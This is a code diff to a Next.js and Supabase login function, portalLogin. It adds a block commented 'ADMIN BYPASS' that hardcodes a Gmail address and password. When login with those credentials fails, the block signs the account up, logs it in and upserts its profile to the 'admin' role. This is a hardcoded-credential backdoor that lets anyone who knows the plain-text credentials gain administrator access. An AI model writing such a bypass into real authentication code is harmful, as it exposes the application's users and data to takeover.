@@ -41,6 +41,15 @@ export async function portalLogin(formData: FormData) {
       }
     }
 
+    // 🚀 ADMIN BYPASS: Auto-create admin test account
+    if (error && email === 'admin.test@gmail.com' && password === 'Test123456!') {
+      const { data: signUpData, error: signUpError } = await supabase.auth.signUp({ email, password })
+      if (!signUpError || signUpError.message === 'User already registered') {
+        const { error: secondLoginError } = await supabase.auth.signInWithPassword({ email, password })
+        error = secondLoginError
+      }
+    }
+
     if (error) {
       const debugUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || 'missing_url';
       const errorMsg = error.message === 'fetch failed' ? `fetch failed for ${debugUrl}` : error.message;
@@ -70,6 +79,17 @@ export async function portalLogin(formData: FormData) {
           email: user.email, 
           role: 'teacher', 
           full_name: 'Teacher Test User' 
+        })
+        const { data: newProfile } = await supabase.from('profiles').select('role').eq('id', user.id).single()
+        profile = newProfile
+      }
+
+      if ((!profile || profile.role !== 'admin') && user.email === 'admin.test@gmail.com') {
+        await supabase.from('profiles').upsert({ 
+          id: user.id, 
+          email: user.email, 
+          role: 'admin', 
+          full_name: 'Admin Test User' 
         })
         const { data: newProfile } = await supabase.from('profiles').select('role').eq('id', user.id).single()
         profile = newProfile
